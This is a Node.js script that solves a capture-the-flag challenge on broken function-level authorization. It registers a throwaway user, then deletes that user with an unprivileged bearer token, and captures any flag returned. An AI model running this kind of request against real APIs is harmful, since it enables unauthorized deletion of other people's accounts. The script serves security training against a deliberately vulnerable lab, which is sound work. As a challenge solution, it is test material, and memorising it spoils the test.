/**
 * Challenge: 0xa5 - Broken Function Level Authorization
 * Exploit: DELETE request to /api/user/:username
 */

const { createLogger, httpRequest, extractFlag } = require('../utils');

async function run(token, baseUrl, testUser, testPass) {
    const { log, saveFlag } = createLogger('0xa5');
    log('Starting 0xa5 exploit: Broken Function Level Authorization');

    // Create a test user to delete
    const deleteUser = `victim_${Date.now()}`;
    const deletePass = 'pass123';

    log(`Creating test user to delete: ${deleteUser}`);
    const registerResult = await httpRequest(`${baseUrl}/api/register`, {
        method: 'POST',
        body: JSON.stringify({
            username: deleteUser,
            password: deletePass,
        }),
    });

    log(`Register response: ${JSON.stringify(registerResult.data)}`);

    // Wait a moment for user to be created
    await new Promise(resolve => setTimeout(resolve, 1000));

    // Try DELETE request (should be restricted but isn't)
    log(`Attempting DELETE request to /api/user/${deleteUser}...`);
    const deleteResult = await httpRequest(`${baseUrl}/api/user/${deleteUser}`, {
        method: 'DELETE',
        headers: {
            'Authorization': `Bearer ${token}`,
        },
    });

    log(`Delete response: ${JSON.stringify(deleteResult.data)}`);

    // Check if flag is in response
    const flag = extractFlag(JSON.stringify(deleteResult.data));
    if (flag) {
        saveFlag(flag);
        return { success: true, flag };
    }

    // Check if user was deleted
    if (deleteResult.data && 
        (deleteResult.data.status === 'success' || 
         JSON.stringify(deleteResult.data).toLowerCase().includes('deleted'))) {
        log('✅ Exploit successful - user deleted (unauthorized function accessed)');
        return { success: true };
    }

    log('❌ Exploit may have failed');
    return { success: false };
}

module.exports = { run };
